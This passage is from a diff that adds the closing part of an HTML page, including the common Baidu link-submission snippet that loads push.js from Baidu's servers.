+       bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+      }
+      else{
+      bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+      }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+    </script>
+
+
+    
+  </div>
+</body>
+
+</html>
